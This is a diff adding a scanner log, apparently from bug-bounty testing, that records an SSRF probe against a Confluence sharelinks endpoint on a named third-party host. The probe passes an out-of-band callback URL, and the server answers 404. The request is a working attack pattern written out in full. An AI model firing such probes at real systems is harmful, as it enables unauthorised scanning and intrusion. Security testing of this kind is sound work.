@@ -1,0 +1,35 @@
+[confluence-ssrf-sharelinks] Dumped HTTP request for https://status.techsolutions.bitpanda.com/rest/sharelinks/1.0/link?url=https://d28vs52us8n0rrg3ds80zc9nbo6hzugux.oast.me/
+
+
+GET /rest/sharelinks/1.0/link?url=https://d28vs52us8n0rrg3ds80zc9nbo6hzugux.oast.me/ HTTP/1.1
+Host: status.techsolutions.bitpanda.com
+User-Agent: Mozilla/5.0 (ZZ; Linux i686; rv:124.0) Gecko/20100101 Firefox/124.0
+Connection: close
+Accept: */*
+Accept-Language: en
+X-Bug-Bounty: Bugcrowd-eno@bugcrowdninja.com
+Accept-Encoding: gzip
+
+
+[confluence-ssrf-sharelinks] Dumped HTTP response https://status.techsolutions.bitpanda.com/rest/sharelinks/1.0/link?url=https://d28vs52us8n0rrg3ds80zc9nbo6hzugux.oast.me/
+
+HTTP/1.1 404 Not Found
+Connection: close
+Atl-Request-Id: a753c205-7ae4-4dd0-b5c1-cea2aab460ec
+Atl-Traceid: a753c2057ae44dd0b5c1cea2aab460ec
+Date: Tue, 05 Aug 2025 12:53:15 GMT
+Nel: {"failure_fraction": 0.001, "include_subdomains": true, "max_age": 600, "report_to": "endpoint-1"}
+Report-To: {"endpoints": [{"url": "https://dz8aopenkvv6s.cloudfront.net"}], "group": "endpoint-1", "include_subdomains": true, "max_age": 600}
+Server: AtlassianEdge
+Server-Timing: atl-edge;dur=66,atl-edge-internal;dur=2,atl-edge-upstream;dur=64,atl-edge-pop;desc="aws-us-east-1"
+Strict-Transport-Security: max-age=63072000; preload
+Via: 1.1 5beb4c3232a40c8c6a3e48c902092760.cloudfront.net (CloudFront)
+X-Amz-Cf-Id: HB7kUTSDgkHjuDwL1UMkpLfQsUsZgGOdvYNlxg2jEK2cssjIT6Q3Xg==
+X-Amz-Cf-Pop: IAD89-C2
+X-Cache: Error from cloudfront
+X-Content-Type-Options: nosniff
+X-Varnish: 118612664
+X-Xss-Protection: 1; mode=block
+Content-Length: 0
+
+
